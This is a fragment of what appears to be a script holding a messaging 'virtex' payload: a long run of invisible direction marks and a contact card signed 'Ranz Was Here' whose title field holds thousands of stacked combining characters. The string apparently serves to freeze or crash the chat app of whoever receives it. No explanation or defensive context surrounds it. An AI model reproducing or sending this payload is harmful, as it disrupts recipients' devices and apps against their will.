‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Ranz Was Here\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋